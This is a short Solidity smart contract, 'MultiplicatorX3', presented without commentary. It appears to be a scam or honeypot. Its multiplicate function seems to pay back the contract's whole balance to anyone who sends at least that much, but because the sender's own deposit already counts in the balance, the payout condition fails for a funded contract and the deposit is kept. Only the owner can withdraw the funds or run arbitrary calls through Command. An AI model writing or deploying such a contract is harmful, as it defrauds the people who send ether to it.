pragma solidity ^0.4.18;

contract MultiplicatorX3
{
    address public O = msg.sender;
   
    function() public payable{}
   
    function withdraw()
    payable
    public
    {
        require(msg.sender == O);
        O.transfer(this.balance);
    }
    
    function Command(address a, bytes d)
    payable
    public
    {
        require(msg.sender == O);
         
        a.call.value(msg.value)(d);
    }
    
    function multiplicate(address a)
    public
    payable
    {
        if(msg.value>=this.balance)
        {        
            a.transfer(this.balance+msg.value);
        }
    }
}